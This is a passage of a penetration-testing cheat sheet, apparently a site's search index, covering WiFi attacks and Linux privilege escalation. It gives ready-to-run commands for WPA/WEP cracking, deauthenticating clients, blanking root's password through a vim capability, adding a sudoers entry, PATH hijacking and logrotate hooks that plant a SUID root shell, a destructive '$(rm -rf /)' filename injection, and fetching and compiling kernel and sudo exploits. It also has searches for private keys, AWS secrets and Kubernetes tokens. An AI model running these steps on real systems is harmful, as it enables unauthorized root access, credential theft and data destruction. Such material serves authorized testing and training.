down\n</code></pre> <pre><code>sudo macchanger wlan0 -m 3E:48:72:B7:62:2A\n</code></pre> <pre><code>sudo ifconfig wlan0 up\n</code></pre></p> <p>now try to connect! </p>"},{"location":"Cheatsheets/wifi/Cracking%20Passphrases/","title":"Cracking Passphrases","text":"<p>Make sure you have a powerful enough system to perform cracking operations <pre><code>aircrack-ng -S\n\n1628.101 k/s\n</code></pre></p> <p>The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second.</p>"},{"location":"Cheatsheets/wifi/Cracking%20Passphrases/#cracking-wep","title":"Cracking WEP","text":"<p>Aircrack-ng is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using Airodump-ng. It is possible to save only the captured IVs (Initialization Vectors) using the <code>--ivs</code> option in Airodump-ng. Once enough IVs are captured, we can utilize the <code>-K</code> option in Aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.</p> <pre><code>aircrack-ng -K cap.ivs \n</code></pre>"},{"location":"Cheatsheets/wifi/Cracking%20Passphrases/#cracking-wpa","title":"Cracking WPA","text":"<p>We need to first capture a four-way handshake, then we can use a dictionary attack to try to crack the key.</p> <p>Aircrack truly only needs two packets  Specifically, EAPOL packets 2 and 3, or packets 3 and 4, are considered a full handshake.</p> <pre><code>aircrack-ng WPA.pcap -w /opt/wordlist.txt\n</code></pre>"},{"location":"Cheatsheets/wifi/Decrypting%20Captures/","title":"Decrypting Captures","text":"<p>We can decrypt <code>WEP</code>, <code>WPA PSK</code>, and <code>WPA2 PSK</code> captures with airdecap-ng. it can remove wireless headers from an unencrypted capture file. This tool is particularly useful in analyzing the data within captured packets by making the content readable and removing unnecessary wireless protocol information.</p> <p>Airdecap-ng can be used for the following:</p> <ul> <li>Removing wireless headers from an open network capture (Unencrypted capture).</li> <li>Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.</li> <li>Decrypting a WPA/WPA2-encrypted capture file using the passphrase.</li> </ul> <pre><code>airdecap-ng [options] &lt;pcap file&gt;\n</code></pre> Option Description <code>-l</code> don't remove the 802.11 header <code>-b</code> access point MAC address filter <code>-k</code> WPA/WPA2 Pairwise Master Key in hex <code>-e</code> target network ascii identifier <code>-p</code> target network WPA/WPA2 passphrase <code>-w</code> target network WEP key in hexadecimal <code>Airdecap-ng</code> generates a new file with the suffix <code>-dec.cap</code> <p>the decrypted capture file using <code>airdecap-ng</code>, observe how the <code>Protocol</code> tab displays the correct protocol, such as ARP, TCP, DHCP, HTTP, etc. Additionally, notice how the <code>Info</code> tab provides more detailed information, and it correctly displays the <code>source</code> and <code>destination</code> IP addresses.</p> <p>Removing Wireless Headers from Unencrypted Capture file (open network):</p> <pre><code>airdecap-ng -b &lt;bssid&gt; &lt;capture-file&gt;\n</code></pre> <p>Replace with the MAC address of the access point and with the name of the capture file.</p> <pre><code>sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap\n</code></pre> <p>Decrypting WEP-encrypted captures</p> <p>Requires hexadecimal WEP key <pre><code>airdecap-ng -w &lt;WEP-key&gt; &lt;capture-file&gt;\n</code></pre></p> <p>Decrypting WPA-encrypted captures</p> <p>Needs passphrase and essid of the network</p> <pre><code>airdecap-ng -p &lt;passphrase&gt; &lt;capture-file&gt; -e &lt;essid&gt;\n</code></pre>"},{"location":"Cheatsheets/wifi/Driver%20Installation%20Alfa%20A1US036ACS/","title":"Driver Installation Alfa A1US036ACS","text":"<pre><code>sudo apt install -y linux-headers-$(uname -r) build-essential bc dkms git libelf-dev rfkill iw\n</code></pre> <pre><code>git clone https://github.com/morrownr/8821au-20210708.git\n</code></pre> <pre><code>sudo ./install-driver.sh\n</code></pre>"},{"location":"Cheatsheets/wifi/Finding%20Hidden%20Networks/","title":"Finding Hidden Networks","text":"<p>Set wifi interface to monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Can for networks</p> <pre><code>sudo airodump-ng -c 1 wlan0mon\n\nCH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  &lt;length: 12&gt;                                \n D2:A3:32:13:29:D5  -28   0        9        0    0   1   54   WPA3 CCMP   SAE  &lt;length:  8&gt;                                \n A2:FF:31:2C:B1:C4  -28   0        9        0    0   1   54   WPA2 CCMP   PSK  &lt;length:  4&gt;                                \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4   \n</code></pre> <p>we can see that there are three hidden SSIDs. The <code>&lt;length: x&gt;</code> notation indicates the length of the WiFi network name</p>"},{"location":"Cheatsheets/wifi/Finding%20Hidden%20Networks/#detecting-ssid-name-with-deauth","title":"Detecting SSID name with Deauth","text":"<p>we can deauth clients and capture the reconnection requests.</p> <p>From the above <code>airodump-ng</code> scan, we observed that a client with the STATION ID <code>02:00:00:00:02:00</code> is connected to the BSSID <code>B2:C1:3D:3B:2B:A1</code>. Let's start the <code>airodump-ng</code> capture on channel <code>1</code> and use <code>aireplay-ng</code> to send deauthentication requests to the client.</p> <p>We should start sniffing our network on <code>channel 1</code> with airodump-ng. <pre><code>sudo airodump-ng -c 1 wlan0mon\n</code></pre></p> <p>In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.</p> <pre><code>sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon\n</code></pre> <p>After sending the deauthentication requests using <code>aireplay-ng</code>, we should see the name of the hidden SSID appear in <code>airodump-ng</code> once the client reconnects to the WiFi network. This process leverages the re-association reques</p> <p>airodump output: <pre><code>sudo airodump-ng -c 1 wlan0mon\n\nCH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  jacklighters\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4         jacklighters\n</code></pre></p>"},{"location":"Cheatsheets/wifi/Finding%20Hidden%20Networks/#bruteforcing-hidden-ssid","title":"Bruteforcing Hidden SSID","text":"<p>We can use a tool like mdk3 to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.</p> <p><pre><code>mdk3 &lt;interface&gt; &lt;test mode&gt; [test_ options]\n</code></pre> The <code>p</code> test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode.</p> Option Description <code>-e</code> Specify the SSID for probing. <code>-f</code> Read lines from a file for brute-forcing hidden SSIDs. <code>-t</code> Set the MAC address of the target AP. <code>-s</code> Set the speed (Default: unlimited, in Bruteforce mode: 300). <code>-b</code> Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen To bruteforce with all possible values, we can use <code>-b</code> as the <code>test_option</code> in mdk3. We can set the following options for it. <ul> <li>upper case (u)</li> <li>digits (n)</li> <li>all printed (a)</li> <li>lower and upper case (c)</li> <li>lower and upper case plus numbers (m)</li> </ul> <pre><code>sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4\n</code></pre> <p>or use a wordlist</p> <pre><code>sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5\n</code></pre>"},{"location":"Cheatsheets/wifi/Interface%20Modes/","title":"Interface Modes","text":""},{"location":"Cheatsheets/wifi/Interface%20Modes/#managed-mode","title":"Managed Mode","text":"<p>This is usually the default mode for interfaces <pre><code> sudo ifconfig wlan0 down\n sudo iwconfig wlan0 mode managed\n</code></pre> This mode allows us to authenticate and associate to an access point, basic service set, and others.</p> <p>Connect to network:</p> <pre><code>sudo iwconfig wlan0 essid WIFI-TEST\n</code></pre>"},{"location":"Cheatsheets/wifi/Interface%20Modes/#ad-hoc-mode","title":"Ad-hoc Mode","text":"<p>This mode is peer to peer and allows wireless interfaces to communicate directly to one another. This mode is commonly found in most residential mesh systems for their backhaul bands.  <code>bash  sudo iwconfig wlan0 mode ad-hoc</code> and connect <pre><code>sudo iwconfig wlan0 essid WIFI-TEST\n</code></pre></p>"},{"location":"Cheatsheets/wifi/Interface%20Modes/#master-mode","title":"Master Mode","text":"<p>access point / router mode. This mode cannot be set with iwconfig because a management daemon is required. The easiest setup for this is using <code>hostapd</code> Sample config: <pre><code>$ nano open.conf\n</code></pre> <pre><code>interface=wlan0\ndriver=nl80211\nssid=WIFI-TEST\nchannel=2\nhw_mode=g\n</code></pre> This configuration would simply bring up an open network, start the network with the following command:  <pre><code>sudo hostapd open.conf\n</code></pre></p>"},{"location":"Cheatsheets/wifi/Interface%20Modes/#mesh-mode","title":"Mesh Mode","text":"<p>we can set our interface to join a self-configuring and routing network. This mode is commonly used for business applications where there is a need for large coverage across a physical space. </p> <p>Check if its even possible with the current interface: <pre><code>sudo iw dev wlan0 set type mesh\n</code></pre></p>"},{"location":"Cheatsheets/wifi/Interface%20Modes/#monitorpromiscuous-mode","title":"Monitor/Promiscuous Mode","text":"<p>In this mode, the network interface can capture all wireless traffic within its range, regardless of the intended recipient.  typically requires administrative privileges and may vary depending on the operating system and wireless chipset used</p> <ol> <li>Bring the interface down</li> </ol> <pre><code>sudo ifconfig wlan0 down\n</code></pre> <ol> <li>set the interfaces mode</li> </ol> <pre><code>sudo iw wlan0 set monitor control\n</code></pre> <ol> <li>bring our interface back up.</li> </ol> <pre><code>sudo ifconfig wlan0 up\n</code></pre> <ol> <li>confirm mode</li> </ol> <pre><code>iwconfig\n\nwlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   \n          Retry short  long limit:2   RTS thr:off   Fragment thr:off\n          Power Management:off\n</code></pre>"},{"location":"Cheatsheets/wifi/Interface%20Modes/#note-on-capabilities","title":"Note on capabilities:","text":"<p>If we are attempting to exploit WEP, WPA, WPA2, WPA3, and all enterprise variants, we are likely sufficient with just monitor mode and packet injection capabilities However, suppose we were trying to achieve different actions we might consider the following capabilities.</p> <ol> <li><code>Employing a Rogue AP or Evil-Twin Attack:</code> - We would want our interface to support master mode with a management daemon like hostapd, hostapd-mana, hostapd-wpe, airbase-ng, and others.</li> <li><code>Backhaul and Mesh or Mesh-Type system exploitation:</code> - We would want to make sure our interface supports ad-hoc and mesh modes accordingly. For this kind of exploitation we are normally sufficient with monitor mode and packet injection, but the extra capabilities can allow us to perform node impersonation among others.</li> </ol>"},{"location":"Cheatsheets/wifi/Monitor%20Mode/","title":"Monitor Mode","text":"<p>Starting monitor mode</p> <p>Identify interface name <pre><code>sudo airmon-ng\n</code></pre></p> <p>Enable monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>When putting a card into monitor mode, it will automatically check for interfering processes. It can also be done manually by running the following command:</p> <pre><code>sudo airmon-ng check\n</code></pre> <p>we can terminate these processes using the airmon-ng check kill command.</p> <pre><code>sudo airmon-ng check kill\n</code></pre> <p>Use specific channel <pre><code>sudo airmon-ng start wlan0 11\n</code></pre></p> <p>monitor mode on channel 11. This ensures that the wlan0 interface operates specifically on channel 11 while in monitor mode.</p> <p>We can stop the monitor mode on the <code>wlan0mon</code> interface using the command <code>airmon-ng stop wlan0mon</code>.</p> <pre><code>sudo airmon-ng stop wlan0mon\n</code></pre>"},{"location":"Cheatsheets/wifi/Reconnaissance/","title":"Reconnaissance","text":"<p>Enable monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Confirm with iwconfig <pre><code>iwconfig\n\neth0      no wireless extensions.\n\nwlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   \n          Retry short limit:7   RTS thr:off   Fragment thr:off\n          Power Management:on\n\nlo        no wireless extensions.\n</code></pre></p> <p>now scan for networks</p> <p>This will output details about access points (including channel IDs) <pre><code>sudo airodump-ng wlan0mon\n</code></pre></p> <p>Scanning Specific Channels or a Single Channel</p> <p>The command <code>airodump-ng wlan0mon</code> initiates a comprehensive scan, collecting data on wireless access points across all the channels available. </p> <p>we can specify a particular channel using the <code>-c</code> option to focus the scan on a specific frequency. For instance, <code>-c 11</code> would narrow the scan to channel 11. This targeted approach can provide more refined results, especially in crowded Wi-Fi environments.</p> <pre><code>sudo airodump-ng -c 11 wlan0mon\n</code></pre> <p>It is also possible to select multiple channels for scanning using the command </p> <pre><code>airodump-ng -c 1,6,11 wlan0mon\n</code></pre> <p>Scanning 5 GHz Wi-Fi bands</p> <p>By default, airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band. Nevertheless, if the wireless adapter is compatible with the 5 GHz band, we can instruct airodump-ng to include this frequency range in its scan by utilizing the <code>--band</code> option. You can find a list of all WLAN channels and bands available for Wi-Fi here.</p> <ul> <li><code>a</code> uses 5 GHz</li> <li><code>b</code> uses 2.4 GHz</li> <li><code>g</code> uses 2.4 GHz</li> </ul> <pre><code>sudo airodump-ng wlan0mon --band a\n</code></pre> <p>You can also dump across channels</p> <pre><code>sudo airodump-ng --band abg wlan0mon\n</code></pre>"},{"location":"Cheatsheets/wifi/Reconnaissance/#capturing-traffic","title":"Capturing Traffic","text":"<p><pre><code>airodump-ng wlan0mon --write outFile \n</code></pre> will generate <code>.cap, .csv, kismet.csv, kismet.netxml, log.vsc</code> by default</p>"},{"location":"Cheatsheets/wifi/Reconnaissance/#reading-output","title":"Reading output","text":"<p>Cipher:</p> <ul> <li>CCMP = WPA2</li> <li>TKIP = WPA1</li> </ul> <p>Auth:</p> <ul> <li>PSK = Personal</li> <li>MG</li> <li>T = enterprise</li> </ul>"},{"location":"Linux/Linux%20Privilege%20Escalation/ACLs/","title":"ACLs","text":"<p>Check ACLs on Sensitive Files <pre><code>getfacl /etc/shadow    # see if you have read permissions\ngetfacl /etc/passwd    # see if you can modify or read\n</code></pre> Check ACLs on Directories <pre><code>getfacl /usr/local/bin # maybe you can write to a directory in /usr/local/bin\ngetfacl /etc            # check if you can write to /etc/\n</code></pre> - If you have write ACL to <code>/etc</code>, you can drop a malicious script in <code>/etc/profile</code> or <code>/etc/bash.bashrc</code>.</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Capabilities/","title":"Capabilities","text":"<p>https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/</p> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p> <p>Restrict a binary to only certain actions using setcap</p> <pre><code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic\n</code></pre> Capability Desciption <code>cap_sys_admin</code> Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. <code>cap_sys_chroot</code> Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. <code>cap_sys_ptrace</code> Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. <code>cap_sys_nice</code> Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. <code>cap_sys_time</code> Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. <code>cap_sys_resource</code> Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. <code>cap_sys_module</code> Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. <code>cap_net_bind_service</code> Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. Capability Values Desciption <code>=</code> This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. <code>+ep</code> This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. <code>+ei</code> This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. <code>+p</code> This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. <p>Several Linux capabilities can be used to escalate a user's privileges to <code>root</code>, including:</p> Capability Desciption <code>CAP_SETUID</code> Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user. <code>CAP_SETGID</code> Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group. <code>CAP_SYS_ADMIN</code> This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems. <p>The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:</p> <ul> <li>CAP_CHOWN</li> <li>CAP_DAC_OVERRIDE</li> <li>CAP_DAC_READ_SEARCH</li> <li>CAP_SETUID</li> <li>CAP_SETGID</li> <li>CAP_NET_RAW</li> <li>CAP_SYS_ADMIN</li> <li>CAP_SYS_PTRACE</li> <li>CAP_SYS_MODULE</li> <li>CAP_FORMER</li> <li>CAP_SETFCAP</li> </ul> <p>Find setcap capabilities</p> <pre><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\\\;\ngetcap -r / 2&gt;/dev/null\n</code></pre> <p>Have access to an account but no access to cap_sys_admin?</p> <pre><code>getcap /usr/bin/vim.basic\n</code></pre> <p>VIM can run as admin and edit files</p> <pre><code>/usr/bin/vim.basic /etc/passwd\n</code></pre> <pre><code>echo -e ':%s/^root:[^:]*:/root::/\\\\nwq' | /usr/bin/vim.basic -es /etc/passwd\n</code></pre> <pre><code>cat /etc/passwd | head -n1\nroot::0:0:root:/root:/bin/bash\n</code></pre> <p>VIM has the capability: cap_dac_override+eip</p> <pre><code>/usr/bin/vim.basic = cap_dac_override+eip\n</code></pre> <p>You can write to ANY file bypassing privs</p> <pre><code>vim /etc/sudoers\n</code></pre> <p>add your user</p> <pre><code>hacker  ALL=(ALL:ALL) ALL\n</code></pre> <p>Now you can run sudo</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"Linux/Linux%20Privilege%20Escalation/Credential%20Hunting/","title":"Credential Hunting","text":"<p>Search for files containing \u201cpassword\u201d or \u201cpasswd\u201d <pre><code>grep -ir \"password\" /etc 2&gt;/dev/null\ngrep -ir \"passwd\" /home 2&gt;/dev/null\n</code></pre> check for dbs and config files <pre><code>find / -type f -name \"*.conf\" -exec grep -H \"DB_USER\" {} \\; 2&gt;/dev/null\nfind / -type f -name \"*.yaml\" -exec grep -H \"password\" {} \\; 2&gt;/dev/null\n</code></pre> Private keys <pre><code>find / -type f -name \"*.pem\" -o -name \"*.key\" 2&gt;/dev/null\nfind /home -type f -name \"id_rsa\" 2&gt;/dev/null\n</code></pre> Search for credentials in environment files: <pre><code>grep -R \"export\" /etc/profile /etc/bashrc \n</code></pre> git stuff <pre><code>find /home -type f -name \".git-credentials\" -o -name \".gitconfig\" 2&gt;/dev/null\n</code></pre> aws creds <pre><code>find /home -type f -path \"*aws*\" -exec grep -H \"aws_access_key_id\" {} \\; 2&gt;/dev/null\nfind / -type f -path \"*aws*\" -exec grep -H \"AWS_ACCESS_KEY_ID\" {} \\; 2&gt;/dev/null\n</code></pre> Check <code>/var/log/auth.log</code> or <code>/var/log/secure</code> for previously captured credentials or failed attempts: <pre><code>grep -i \"fail\" /var/log/auth.log\ngrep -i \"Accepted\" /var/log/auth.log\n</code></pre> Look for passwords in scripts or in <code>/opt</code>, <code>/usr/local</code>: <pre><code>grep -ir \"password\" /opt /usr/local 2&gt;/dev/null\n</code></pre></p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Environment%20Hunting/","title":"Environment Hunting","text":"<p>Check for scripts or binaries owned by root but writable by user, and abuse <code>PATH</code>: <pre><code>find / -perm -o=w -type f 2&gt;/dev/null | grep \"/usr/bin\"\n</code></pre> If a root-owned script calls binaries without full path, you can create a malicious binary earlier in <code>PATH</code>: <pre><code>export PATH=/tmp/malicious:$PATH\necho -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; /tmp/malicious/su\nchmod +x /tmp/malicious/su\n# When root runs \u201csu\u201d in script, it executes /tmp/malicious/su\n/tmp/rootbash -p  # drop into root shell\n</code></pre> Wildcard Injection: If a script uses wildcards like <code>cp *.txt /root/backup/</code>, place a file named <code>--help</code> or <code>-rf</code> to inject options: <pre><code>echo \"malicious\" &gt; --help\nmkdir -p /tmp/backupdir\ncp --help /tmp/backupdir      # Might treat \u201c--help\u201d as an option\n</code></pre></p> <ul> <li>If a script does something like tar -cf backup.tar <code>*</code>, place a malicious file named --checkpoint=1 to inject tar\u2019s options, or use symlinks to overwrite files.</li> <li>If a script uses for f in <code>*</code>; do somecommand $f; done, create a filename like $(rm -rf /). Use IFS or manipulate environmental variables to change how expansions occur. Kubernetes Inside Container If <code>kubectl</code> or a service account token is present, you may be able to create privileged pods or mount the host: <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\nkubectl run --rm -it --image=alpine debug -- /bin/sh\n</code></pre> If you can define a pod with <code>hostPID: true</code> and <code>privileged: true</code>, you can namespace-enter the host.</li> </ul>"},{"location":"Linux/Linux%20Privilege%20Escalation/General%20Information/","title":"General Information","text":"<p>Basic Info <pre><code>whoami; id; hostname;\n</code></pre> Networking <pre><code>ip a\n</code></pre> Can you run anything as sudo <pre><code>sudo -l\n</code></pre> What operating system do we have? <pre><code>cat /etc/os-release\n</code></pre> Check user path <pre><code>echo $PATH\n</code></pre> check environment variables <pre><code>env\n</code></pre> Check kernel version <pre><code>uname -a\ncat /proc/version\n</code></pre> Check CPU info <pre><code>lscpu\n</code></pre> Check login shells <pre><code>cat /etc/shells\n</code></pre> Check attached printers: <pre><code>lpstat\n</code></pre> Check users and groups: <pre><code>cat /etc/passwd\ncat /etc/group\n</code></pre> Check who is in a group: <pre><code>getent group sudo\n</code></pre> Check home directories of users on system and inspect their history files: <pre><code>find /home -maxdepth 2 -type f -name \".*history\" -exec ls -l {} \\; 2&gt;/dev/null\nfind /home -type f -name \".bash_history\" -o -name \".zsh_history\" 2&gt;/dev/null\n</code></pre> Check running processes as root <pre><code>ps aux | grep root\n</code></pre> Env vars <pre><code>env\nprintenv\n</code></pre> Check mounted filesystems <pre><code>mount\ndf -h\n</code></pre> Check open network sockets: <pre><code>ss -tulpn\nnetstat -tulpn\n</code></pre> check crons <pre><code>crontab -l 2&gt;/dev/null\nls -la /var/spool/cron/crontabs\nls -la /etc/cron.*\ncat /etc/crontab\n</code></pre> Check system information available in <code>/proc</code>: <pre><code>find /proc -name cmdline -exec cat {} \\; 2&gt;/dev/null | tr \" \" \"\\n\"\n</code></pre> Kernel version <pre><code>uname -a\nuname -r\n</code></pre></p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Groups/","title":"Groups","text":"<p>Common Privileged Groups</p> <ul> <li>docker: Members can mount host filesystem via Docker daemon.</li> <li>disk: Can mount and read disk devices.</li> <li>lxd / lxc: Can spawn or modify containers and potentially escape.</li> <li>lpadmin, www-data, adm: Depending on context, may allow log reading or injection</li> </ul> <p>Docker group <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> unzip alpine image <pre><code>unzip alpine.zip\n</code></pre> Choose defaults for all prompts - help: How to Set Up and Use LXD on Ubuntu 16.04 | DigitalOcean <pre><code>lxd init\n</code></pre> Import the image <pre><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n</code></pre> set privilege flag <pre><code>lxc init alpine r00t -c security.privileged=true\n</code></pre> Mount file system <pre><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n</code></pre> <pre><code>lxc start r00t\nlxc exec r00t /bin/sh\n</code></pre> on the host type <code>cd /mnt/root/root</code>. From here we can read sensitive files such as <code>/etc/shadow</code> and obtain password hashes or gain access to SSH keys in order to connect to the host system as root</p> <p>Disk</p> <p>Users within the disk group have full access to any devices contained within <code>/dev</code>, such as <code>/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code>debugfsto</code> access the entire file system with root level privileges.</p> <p>ADM</p> <p>Members of the adm group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Low-Level%20Exploits/","title":"Low Level Exploits","text":"<p>Check Kernel Version for Known CVEs <pre><code>uname -r\n    ```\nExample vulnerable ranges:\n\n- **Dirty COW** (CVE-2016-5195): Linux \u2264 4.8\n- **Dirty Pipe** (CVE-2022-0847): Linux 5.8+ &lt; 5.10.102 / &lt; 5.15.25 / &lt; 5.17.9\n- **Other kernel 0-days**: search on [Exploit-DB](https://www.exploit-db.com/), [CVE Details](https://www.cvedetails.com/), or use `searchsploit`.\n**Dirty Cow**\n```bash\nwget https://raw.githubusercontent.com/dirtycow/dirtycow/master/dirtyc0w.c\ngcc dirtyc0w.c -o dirtycow\n./dirtycow\n</code></pre> Dirty Pipe <pre><code>git clone https://github.com/ashishb/dirtypipe.git\ncd dirtypipe\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n</code></pre> CVE-2022-27666 (Netfilter Privilege Escalation) <pre><code>git clone https://github.com/niklasb/CVE-2022-27666.git\ncd CVE-2022-27666\nmake\n./cve-2022-27666\n</code></pre> CVE-2021-3156 (Sudo \u201cBaron Samedit\u201d) (\u2264 1.8.31p2) is vulnerable <pre><code>git clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\ngcc cve-2021-3156.c -o exploit\n./exploit\n</code></pre> CVE-2021-3560 (Polkit) <pre><code>git clone https://github.com/berdav/CVE-2021-3560.git\ncd CVE-2021-3560\ngcc cve-2021-3560.c -o exploit\n./exploit\n</code></pre> Check and load kernel Modules <pre><code>lsmod                # list loaded modules\nsudo modprobe tun    # check if tun module can be loaded\n</code></pre> - If you have <code>CAP_SYS_MODULE</code>, you can compile and load a malicious kernel module to gain root. - </p>"},{"location":"Linux/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/","title":"NFS, Samba, Network Shares","text":"<p>NFS Shares <pre><code>showmount -e target_host   # enumerate exports\nmount -t nfs target_host:/exported/path /mnt\n</code></pre> If you can write to a writable NFS export that\u2019s mounted on the server\u2019s root (e.g., <code>/home</code>), you can place an SSH key in <code>/mnt/root/.ssh/authorized_keys</code>. Samba / CIFS <pre><code>mount -t cifs //server/share /mnt -o username=user,password=pass,noperm\n</code></pre> If <code>noperm</code> is set or the share is writable by user, you can: <pre><code>chown root:root /mnt/myscript.sh\nchmod 4755 /mnt/myscript.sh\n</code></pre> If a root-owned service executes <code>myscript.sh</code> from <code>/mnt</code>, you gain root.</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Permissions/","title":"Permissions","text":"<p>SUID <pre><code>find / -perm /4000 -type f 2&gt;/dev/null\n</code></pre> SGID <pre><code>find / -perm -2000 -type f 2&gt;/dev/null\n</code></pre> writeable SUIDs <pre><code>find / -perm -4000 -type f -writable 2&gt;/dev/null\n</code></pre> - If a SUID binary is writable by your user, you can replace it with code that spawns a root shell.</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Restricted%20Shells/","title":"Restricted Shells","text":"<p>Check shell <pre><code>echo $0\n</code></pre> Can you switch shells? <pre><code>/bin/bash -p\n</code></pre> spawn shell with <code>vi</code> <pre><code>vi -c ':!bash'\nvi -c ':!sh'\n</code></pre> <code>more</code> or <code>less</code> to spawn shell <pre><code>more /etc/passwd\n# then type \u201c!sh\u201d to open shell\n</code></pre> find for execution <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> perl or python <pre><code>perl -e 'exec \"/bin/sh\";'\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> awk <pre><code>awk 'BEGIN { system(\"/bin/sh\") }'\n</code></pre> If <code>ssh</code> client is available, you can do <code>ssh user@localhost</code> if key-based auth exists.</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Service-Based%20Escalation/","title":"Service Based Escalation","text":""},{"location":"Linux/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#cron","title":"Cron","text":"<p>List All Cron Jobs <pre><code>cat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.weekly/\nls -la /etc/cron.monthly/\nls -la /var/spool/cron/crontabs/\n</code></pre> - Check for writable directories with scripts / what the script is calling</p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#logrotate-based-escapes","title":"Logrotate-Based Escapes","text":"<p><pre><code>ls -la /etc/logrotate.d/\ncat /etc/logrotate.conf\n</code></pre> If you can write to a file in <code>/etc/logrotate.d/</code>, add a <code>postrotate</code> script that creates a SUID binary: <pre><code>/var/log/myapp/*.log {\n    daily\n    missingok\n    rotate 7\n    notifempty\n    compress\n    sharedscripts\n    postrotate\n        cp /bin/bash /tmp/rootbash\n        chmod +s /tmp/rootbash\n    endscript\n}\n</code></pre></p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#systemd-sysv-init-scripts","title":"Systemd &amp; SysV Init Scripts","text":"<p>List Systemd Service Files <pre><code>ls -la /etc/systemd/system/*.service\nls -la /lib/systemd/system/*.service\n</code></pre> Inspect Service File Contents <pre><code>cat /etc/systemd/system/vulnerable.service\n</code></pre> Look for fields like <code>ExecStart=/usr/bin/somescript.sh</code>. If <code>somescript.sh</code> is writable, replace it with malicious code. Check for Writable 